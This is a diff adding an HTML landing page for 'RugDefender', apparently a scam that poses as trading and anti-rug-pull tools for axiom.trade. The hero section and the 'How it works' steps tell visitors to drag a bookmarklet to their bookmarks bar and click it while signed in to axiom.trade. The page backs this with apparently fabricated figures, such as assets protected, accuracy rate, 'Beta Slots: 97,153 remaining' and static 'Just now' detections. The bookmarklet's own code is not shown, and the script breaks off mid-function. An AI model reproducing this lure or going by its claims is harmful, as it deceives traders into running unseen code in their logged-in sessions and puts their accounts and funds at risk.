@@ -1,0 +1,1589 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RugDefender - Advanced Trading Tools for Axiom.trade</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #111111;
+            --bg-card: #1a1a1a;
+            --bg-hover: #222222;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --text-muted: #666666;
+            --accent-primary: #3b82f6;
+            --accent-secondary: #1d4ed8;
+            --accent-success: #10b981;
+            --accent-warning: #f59e0b;
+            --accent-danger: #ef4444;
+            --border-color: #333333;
+        }
+
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 1rem;
+        }
+
+        /* Header */
+        .header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: var(--bg-primary);
+            border-bottom: 1px solid var(--border-color);
+            z-index: 1000;
+        }
+
+        .nav {
+            display: grid;
+            grid-template-columns: auto;
+            align-items: center;
+            padding: 1rem 2rem;
+            height: 70px;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            text-decoration: none;
+            letter-spacing: 0.5px;
+            margin-left: 1rem;
+        }
+
+        .nav-search {
+            width: 100%;
+            padding: 0.5rem 1rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            transition: all 0.3s ease;
+        }
+
+        .nav-search:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.1);
+        }
+
+        .nav-search::placeholder {
+            color: var(--text-muted);
+        }
+
+        .nav-right a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.85rem;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            transition: all 0.2s ease;
+        }
+
+        .nav-right a:hover {
+            color: var(--text-primary);
+            background: var(--bg-hover);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 140px 0 5rem;
+            background: var(--bg-primary);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stars-canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .hero .container {
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero-title h1 {
+            font-size: 8rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            letter-spacing: -4px;
+            line-height: 1.05;
+            margin-bottom: 2rem;
+        }
+
+        /* Updated hero description and made CTA more prominent */
+        .hero-description {
+            font-size: 1.4rem;
+            color: var(--text-secondary);
+            max-width: 700px;
+            margin: 0 auto 2.5rem;
+            line-height: 1.6;
+            font-weight: 400;
+        }
+
+        .hero-cta {
+            margin: 3rem 0;
+        }
+
+        .drag-button {
+            display: inline-block;
+            padding: 1.5rem 3rem;
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+            cursor: grab;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .drag-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.3);
+        }
+
+        .drag-button:active {
+            cursor: grabbing;
+        }
+
+        .drag-button-container {
+            position: relative;
+            display: inline-block;
+        }
+
+        .tutorial-link-container {
+            margin-top: 1rem;
+        }
+
+        .tutorial-link {
+            display: inline-block;
+            padding: 0.75rem 1.5rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 500;
+            border-radius: 20px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .tutorial-link:hover {
+            background: var(--bg-hover);
+            color: var(--text-primary);
+            border-color: var(--accent-primary);
+            transform: translateY(-1px);
+        }
+
+        .install-popup {
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            width: 350px;
+            margin-bottom: 1rem;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            z-index: 100;
+        }
+
+        .drag-button-container:hover .install-popup {
+            opacity: 1;
+            visibility: visible;
+            transform: translateX(-50%) translateY(-5px);
+        }
+
+        .install-popup::after {
+            content: '';
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            border: 8px solid transparent;
+            border-top-color: var(--bg-card);
+        }
+
+        .popup-title {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .popup-content {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+
+        .keyboard-shortcut {
+            background: var(--bg-secondary);
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--accent-primary);
+            border: 1px solid var(--border-color);
+        }
+
+        /* Stats Ticker */
+        .stats-ticker {
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border-color);
+            border-bottom: 1px solid var(--border-color);
+            padding: 1rem 0;
+            margin: 3rem 0;
+            overflow: hidden;
+            width: 100vw;
+            position: relative;
+            left: 50%;
+            right: 50%;
+            margin-left: -50vw;
+            margin-right: -50vw;
+        }
+
+        .ticker-content {
+            display: flex;
+            gap: 3rem;
+            width: max-content;
+            animation: scroll 30s linear infinite;
+            will-change: transform;
+        }
+
+        .ticker-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            white-space: nowrap;
+            font-size: 0.85rem;
+        }
+
+        .ticker-icon {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--accent-success);
+        }
+
+        .ticker-value {
+            color: var(--accent-success);
+            font-weight: 600;
+        }
+
+        @keyframes scroll {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        /* Insights Section */
+        .insights-section {
+            margin: 4rem 0;
+        }
+
+        .section-title {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .insights-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .insight-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            transition: all 0.2s ease;
+        }
+
+        .insight-card:hover {
+            border-color: var(--accent-primary);
+            background: var(--bg-hover);
+        }
+
+        .insight-tags {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .insight-tag {
+            padding: 0.25rem 0.75rem;
+            background: var(--accent-primary);
+            color: white;
+            font-size: 0.7rem;
+            border-radius: 12px;
+            font-weight: 500;
+        }
+
+        .insight-tag.important { background: var(--accent-danger); }
+        .insight-tag.bullish { background: var(--accent-success); }
+
+        .insight-title {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 0.5rem;
+            line-height: 1.4;
+        }
+
+        .insight-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        /* Data Section */
+        .data-section {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+            margin: 4rem 0;
+        }
+
+        .data-panel {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .data-header {
+            padding: 1rem 1.5rem;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .data-title {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .data-filters {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .filter-btn {
+            padding: 0.25rem 0.75rem;
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            font-size: 0.7rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .filter-btn:hover,
+        .filter-btn.active {
+            background: var(--accent-primary);
+            color: white;
+            border-color: var(--accent-primary);
+        }
+
+        .data-content {
+            padding: 1rem 1.5rem;
+        }
+
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.75rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 0.85rem;
+        }
+
+        .data-row:last-child {
+            border-bottom: none;
+        }
+
+        .data-label {
+            color: var(--text-secondary);
+        }
+
+        .data-value {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .data-value.positive { color: var(--accent-success); }
+        .data-value.negative { color: var(--accent-danger); }
+
+        /* Footer */
+        .footer {
+            border-top: 1px solid var(--border-color);
+            padding: 2rem 0;
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.8rem;
+        }
+
+        /* Box Reveal Animation */
+        .box-reveal {
+            position: relative;
+            display: block;
+            overflow: hidden;
+        }
+
+        .box-reveal.inline {
+            display: inline-block;
+        }
+
+        .box-reveal-content {
+            opacity: 0;
+            transform: translateY(25px);
+            transition: opacity 0.6s ease 0.3s, transform 0.6s ease 0.3s;
+        }
+
+        .box-reveal-content.animate {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .box-reveal-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--accent-primary);
+            z-index: 20;
+            transform: translateX(-100%);
+            transition: transform 0.8s cubic-bezier(0.76, 0, 0.24, 1);
+        }
+
+        .box-reveal-overlay.animate {
+            transform: translateX(100%);
+        }
+
+        /* Dynamic Loading Animations */
+        .fade-in-up {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.6s ease;
+        }
+
+        .fade-in-up.animate {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .fade-in-left {
+            opacity: 0;
+            transform: translateX(-30px);
+            transition: all 0.6s ease;
+        }
+
+        .fade-in-left.animate {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .fade-in-right {
+            opacity: 0;
+            transform: translateX(30px);
+            transition: all 0.6s ease;
+        }
+
+        .fade-in-right.animate {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .scale-in {
+            opacity: 0;
+            transform: scale(0.9);
+            transition: all 0.5s ease;
+        }
+
+        .scale-in.animate {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        /* Staggered animations */
+        .stagger-1 { transition-delay: 0.1s; }
+        .stagger-2 { transition-delay: 0.2s; }
+        .stagger-3 { transition-delay: 0.3s; }
+        .stagger-4 { transition-delay: 0.4s; }
+        .stagger-5 { transition-delay: 0.5s; }
+
+        /* Loading pulse effect */
+        .pulse-loading {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .nav { padding: 1rem; height: 60px; }
+            .nav-center { display: none; }
+            .nav-right { display: none; }
+            .hero-title h1 { font-size: 3.5rem; }
+            .data-section { grid-template-columns: 1fr; }
+            .insights-grid { grid-template-columns: 1fr; }
+        }
+
+        /* Added missing search section styling */
+        .search-section {
+            background: var(--bg-secondary);
+            padding: 2rem 0;
+            border-top: 1px solid var(--border-color);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .search-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            transition: transform 0.2s ease;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 1.5rem 2rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .search-input:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+
+        .search-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        /* Added proper CTA section styling */
+        .cta-section {
+            background: var(--bg-secondary);
+            padding: 4rem 0;
+            text-align: center;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .cta-title {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 1rem;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .cta-description {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto 2.5rem;
+            line-height: 1.6;
+        }
+
+        .cta-button {
+            display: inline-block;
+            padding: 1.5rem 3rem;
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.3);
+        }
+
+        /* Tutorial Section */
+        .tutorial-section {
+            margin: 4rem 0;
+            background: var(--bg-secondary);
+            padding: 4rem 0;
+            border-top: 1px solid var(--border-color);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .tutorial-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4rem;
+            align-items: center;
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 aspect ratio */
+            background: var(--bg-card);
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+        }
+
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 12px;
+        }
+
+        .video-placeholder {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, var(--bg-card) 0%, var(--bg-hover) 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .video-placeholder:hover {
+            background: linear-gradient(135deg, var(--bg-hover) 0%, var(--bg-card) 100%);
+        }
+
+        .play-button {
+            margin-bottom: 1rem;
+            transition: transform 0.3s ease;
+        }
+
+        .video-placeholder:hover .play-button {
+            transform: scale(1.1);
+        }
+
+        .video-overlay span {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .tutorial-steps {
+            display: flex;
+            flex-direction: column;
+            gap: 2rem;
+        }
+
+        .step-item {
+            display: flex;
+            gap: 1.5rem;
+            align-items: flex-start;
+        }
+
+        .step-number {
+            width: 40px;
+            height: 40px;
+            background: var(--accent-primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 1.1rem;
+            flex-shrink: 0;
+        }
+
+        .step-content h4 {
+            color: var(--text-primary);
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .step-content p {
+            color: var(--text-secondary);
+            line-height: 1.6;
+            font-size: 0.95rem;
+        }
+        
+        .rug {
+            font-size: 5rem !important;
+            font-weight: 800 !important;
+            letter-spacing: -5px !important;
+        }
+
+        /* Enhanced mobile responsiveness for new elements */
+        @media (max-width: 768px) {
+            .nav { padding: 1rem; height: 60px; }
+            .nav-center { display: none; }
+            .nav-right { display: none; }
+            .hero-title h1 { font-size: 4.5rem; letter-spacing: -2px; }
+            .rug { font-size: 2.5rem !important; letter-spacing: -3px !important; }
+            .hero-description { font-size: 1.1rem; max-width: 90%; }
+            .hero { padding: 100px 0 3rem; }
+            .data-section { grid-template-columns: 1fr; }
+            .insights-grid { grid-template-columns: 1fr; }
+            .search-container { padding: 0 1rem; }
+            .search-input { padding: 1.25rem 1.5rem; font-size: 0.9rem; }
+            .cta-title { font-size: 1.5rem; }
+            .cta-description { font-size: 1rem; }
+            .drag-button, .cta-button { padding: 1.25rem 2rem; font-size: 1rem; }
+            .tutorial-content { grid-template-columns: 1fr; gap: 2rem; }
+            .tutorial-section { padding: 2rem 0; }
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .nav-left-group {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            margin-left: 0.5rem;
+        }
+
+        .nav-left-group .tab {
+            padding: 0.35rem 0.75rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.85rem;
+        }
+
+        .nav-left-group .tab.active {
+            color: var(--text-primary);
+            box-shadow: 0 0 0 1px rgba(255,255,255,0.04) inset;
+        }
+
+        .nav-left-group .link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.85rem;
+        }
+
+        .nav-left-group .link:hover { color: var(--text-primary); }
+
+        .nav-left-group .divider {
+            width: 1px;
+            height: 24px;
+            background: var(--border-color);
+            margin: 0 0.25rem;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <nav class="nav">
+            <div class="nav-left">
+                <a href="#" class="logo">RugDefender</a>
+                <div class="nav-left-group">
+                    <a href="#" class="tab active">Intel</a>
+                    <div class="divider"></div>
+                    <a href="#" class="link">Tools ▾</a>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Refocused hero section with new copy and prominent CTA -->
+    <section class="hero">
+        <canvas class="stars-canvas" id="starsCanvas"></canvas>
+        <div class="container">
+            <div class="box-reveal inline" id="heroTitle">
+                <div class="box-reveal-content">
+                    <h1 class="rug">RugDefender</h1>
+                </div>
+                <div class="box-reveal-overlay"></div>
+            </div>
+            
+            <div class="box-reveal" id="heroDescription">
+                <div class="box-reveal-content">
+                    <p class="hero-description">
+                        Advanced trading tools that give you an edge on axiom.trade. Monitor influencers, track wallets, automate buys, and never miss opportunities again.
+                    </p>
+                </div>
+                <div class="box-reveal-overlay"></div>
+            </div>
+
+            <div class="hero-cta fade-in-up">
+                <div class="drag-button-container">
+                    <a href="#" class="drag-button bookmarklet">
+                        Drag me to Start
+                    </a>
+                    <div class="install-popup">
+                        <div class="popup-title">
+                            📖 How to Install
+                        </div>
+                        <div class="popup-content">
+                            Drag this button to your bookmarks bar (press <span class="keyboard-shortcut">CTRL + SHIFT + B</span> if hidden) then click the bookmarklet while on Axiom to activate RugDefender.
+                        </div>
+                    </div>
+                </div>
+                <div class="tutorial-link-container">
+                    <a href="#" class="tutorial-link" id="tutorialLink">
+                        Still Confused? Watch our Tutorial
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats ticker moved below hero -->
+    <div class="stats-ticker">
+        <div class="container" style="position: relative;">
+            <div class="ticker-content">
+                <div class="ticker-item">
+                    <div class="ticker-icon"></div>
+                    <span>~$50M+</span>
+                    <span class="ticker-value">Protected Assets</span>
+                    <span class="ticker-change">+2.5%</span>
+                </div>
+                <div class="ticker-item">
+                    <div class="ticker-icon"></div>
+                    <span>1000+</span>
+                    <span class="ticker-value">SPL Scams Detected</span>
+                    <span class="ticker-change">+3.2%</span>
+                </div>
+                <div class="ticker-item">
+                    <div class="ticker-icon"></div>
+                    <span>99.9%</span>
+                    <span class="ticker-value">Accuracy Rate</span>
+                    <span class="ticker-change">+0.1%</span>
+                </div>
+                <!-- Duplicate for seamless scroll -->
+                <div class="ticker-item">
+                    <div class="ticker-icon"></div>
+                    <span>~$50M+</span>
+                    <span class="ticker-value">Protected Assets</span>
+                    <span class="ticker-change">+2.5%</span>
+                </div>
+                <div class="ticker-item">
+                    <div class="ticker-icon"></div>
+                    <span>1000+</span>
+                    <span class="ticker-value">SPL Scams Detected</span>
+                    <span class="ticker-change">+3.2%</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Insights section like Arkham's trending insights -->
+    <section id="insights" class="insights-section">
+        <div class="container">
+            <h2 class="section-title fade-in-up">WHY RugDefender</h2>
+            <div class="insights-grid">
+                <div class="insight-card fade-in-left stagger-1">
+                    <div class="insight-tags">
+                        <span class="insight-tag important">Essential</span>
+                        <span class="insight-tag bullish">Edge</span>
+                    </div>
+                    <h3 class="insight-title">One-Click Simplicity - No downloads, no extensions, no friction. Just drag, click, and unlock intelligence right inside Axiom.trade.</h3>
+                    <div class="insight-meta">
+                        <span>Active Users: 2,847</span>
+                        <span>Live Now</span>
+                    </div>
+                </div>
+                
+                <div class="insight-card fade-in-up stagger-2">
+                    <div class="insight-tags">
+                        <span class="insight-tag important">Critical</span>
+                        <span class="insight-tag">Protection</span>
+                    </div>
+                    <h3 class="insight-title">Advanced Wallet Tracking - Monitor influencers, track whale movements, and automate your trading strategy with real-time intelligence.</h3>
+                    <div class="insight-meta">
+                        <span>Wallets Tracked: 15,000+</span>
+                        <span>Updated: Real-time</span>
+                    </div>
+                </div>
+
+                <div class="insight-card fade-in-right stagger-3">
+                    <div class="insight-tags">
+                        <span class="insight-tag">Exclusive</span>
+                        <span class="insight-tag bullish">Beta</span>
+                    </div>
+                    <h3 class="insight-title">Limited Beta Access - Join 100,000 early adopters worldwide getting institutional-grade trading tools before public release.</h3>
+                    <div class="insight-meta">
+                        <span>Beta Slots: 97,153 remaining</span>
+                        <span>Closing Soon</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Added prominent CTA section within insights -->
+
+        </div>
+    </section>
+
+    <!-- Tutorial Video Section -->
+    <section class="tutorial-section">
+        <div class="container">
+            <h2 class="section-title fade-in-up">HOW IT WORKS</h2>
+            <div class="tutorial-content">
+                <div class="tutorial-video fade-in-left">
+                    <div class="video-container">
+                        <iframe src="https://www.youtube.com/embed/PvArCev1gXU" title="RugDefender Tutorial Video" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="">
+                        </iframe>
+                    </div>
+                </div>
+                <div class="tutorial-steps fade-in-right">
+                    <div class="step-item">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h4>Drag the Bookmarklet</h4>
+                            <p>Drag the "Drag me to Start" button to your bookmarks bar. No downloads required.</p>
+                        </div>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h4>Navigate to Axiom</h4>
+                            <p>Go to axiom.trade and sign in to your account as usual.</p>
+                        </div>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h4>Activate RugDefender</h4>
+                            <p>Click the bookmarklet to instantly unlock advanced trading intelligence.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Data section with two panels like Arkham -->
+    <section id="data" class="data-section">
+        <div class="container" style="display: contents;">
+            <div class="data-panel fade-in-left">
+                <div class="data-header">
+                    <h3 class="data-title">PROTECTION METRICS</h3>
+                    <div class="data-filters">
+                        <button class="filter-btn active">ALL</button>
+                        <button class="filter-btn">24H</button>
+                    </div>
+                </div>
+                <div class="data-content">
+                    <div class="data-row">
+                        <span class="data-label">Protected Assets</span>
+                        <span class="data-value positive">$50.2M</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="data-label">24H Volume</span>
+                        <span class="data-value">$192,288,321.80</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="data-label">Market Cap</span>
+                        <span class="data-value">$216,748,065.78</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="data-label">All Time High</span>
+                        <span class="data-value">$7.47</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="data-label">All Time Low</span>
+                        <span class="data-value">$1.50</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="data-panel fade-in-right">
+                <div class="data-header">
+                    <h3 class="data-title">RECENT DETECTIONS</h3>
+                    <div class="data-filters">
+                        <button class="filter-btn active">ALL</button>
+                        <button class="filter-btn">SCAMS</button>
+                        <button class="filter-btn">SORT BY TIME</button>
+                    </div>
+                </div>
+                <div class="data-content">
+                    <div class="data-row pulse-loading">
+                        <span class="data-label">🔴 Just now</span>
+                        <span class="data-value negative">Rugpull Detected</span>
+                    </div>
+                    <div class="data-row pulse-loading">
+                        <span class="data-label">🔴 Just now</span>
+                        <span class="data-value negative">Suspicious Liquidity</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="data-label">🔴 Just now</span>
+                        <span class="data-value negative">Whale Dump Alert</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="data-label">🔴 30 seconds ago</span>
+                        <span class="data-value negative">Token Migration</span>
+                    </div>
+                    <div class="data-row">
+                        <span class="data-label">🔴 30 seconds ago</span>
+                        <span class="data-value negative">Honeypot Contract</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA section with Arkham styling -->
+    <section class="cta-section">
+        <div class="container">
+            <h2 class="cta-title scale-in">Join the Beta</h2>
+            <p class="cta-description fade-in-up stagger-1">Be among the first to experience next-generation Solana protection with institutional-grade intelligence.</p>
+            <a href="#" class="cta-button scale-in stagger-2 bookmarklet">Drag me to Start</a>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>� 2024 RugDefender. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        function initBoxReveal() {
+            // Animate title first
+            const titleBoxReveal = document.getElementById('heroTitle');
+            const titleContent = titleBoxReveal.querySelector('.box-reveal-content');
+            const titleOverlay = titleBoxReveal.querySelector('.box-reveal-overlay');
+            
+            setTimeout(() => {
+                titleOverlay.classList.add('animate');
+                setTimeout(() => {
+                    titleContent.classList.add('animate');
+                }, 200);
+                setTimeout(() => {
+                    titleOverlay.style.display = 'none';
+                }, 800);
+            }, 500);
+
+            // Animate description after title with delay
+            const descBoxReveal = document.getElementById('heroDescription');
+            const descContent = descBoxReveal.querySelector('.box-reveal-content');
+            const descOverlay = descBoxReveal.querySelector('.box-reveal-overlay');
+            
+            setTimeout(() => {
+                descOverlay.classList.add('animate');
+                setTimeout(() => {
+                    descContent.classList.add('animate');
+                }, 200);
+                setTimeout(() => {
+                    descOverlay.style.display = 'none';
+                }, 800);
+            }, 1200); // Start 700ms after title animation starts
+        }
+
+        // Initialize dynamic loading animations
+        function initAnimations() {
+            const animatedElements = document.querySelectorAll('.fade-in-up, .fade-in-left, .fade-in-right, .scale-in');
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('animate');
+                    }
+                });
+            }, {
+                threshold: 0.1,
+                rootMargin: '0px 0px -50px 0px'
+            });
+
+            animatedElements.forEach(element => {
+                observer.observe(element);
+            });
+        }
+
+        // Search functionality
+        function initSearch() {
+            const navSearchInput = document.getElementById('navTokenSearch');
+            
+            function handleSearch(searchInput) {
+                searchInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        const searchTerm = this.value.trim();
+                        if (searchTerm) {
+                            // Check if it looks like a token address (basic validation)
+                            const isTokenAddress = /^[A-Za-z0-9]{32,44}$/.test(searchTerm);
+                            
+                            if (isTokenAddress) {
+                                // Redirect to bastion.gg with token address
+                                window.open(`https://bastion.gg/token/${searchTerm}`, '_blank');
+                            } else {
+                                // For non-address searches, still redirect but let bastion handle it
+                                window.open(`https://bastion.gg/search?q=${encodeURIComponent(searchTerm)}`, '_blank');
+                            }
+                            
+                            // Clear the search input
+                            this.value = '';
+                        }
+                    }
+                });
+            }
+
+            if (navSearchInput) {
+                handleSearch(navSearchInput);
+            }
+        }
+
+        function initTicker() {
+            const track = document.querySelector('.stats-ticker .ticker-content');
+            if (!track || track.getAttribute('data-duplicated') === 'true') return;
+            const items = Array.from(track.children);
+            items.forEach(node => track.appendChild(node.cloneNode(true)));
+            track.setAttribute('data-duplicated', 'true');
+        }
+
+        document.querySelectorAll('.filter-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                this.parentNode.querySelectorAll('.filter-btn').forEach(sibling => {
+                    sibling.classList.remove('active');
+                });
+                this.classList.add('active');
+            });
+        });
+
+        // Starfield Animation
+        function initStarfield() {
+            const canvas = document.getElementById('starsCanvas');
+            if (!canvas) return;
+
+            const ctx = canvas.getContext('2d');
+            let perspective = 0;
+            let stars = [];
+            const starCount = 200;
+            const starColor = '#3b82f6'; // Blue accent color
+
+            function resizeCanvas() {
+                canvas.width = canvas.clientWidth;
+                canvas.height = canvas.clientHeight;
+                perspective = canvas.width / 2;
+            }
+
+            function hexToRgb(hex) {
+                hex = hex.replace(/^#/, '');
+                
+                if (hex.length === 3) {
+                    hex = hex.split('').map(char => char + char).join('');
+                }
+
+                const bigint = parseInt(hex, 16);
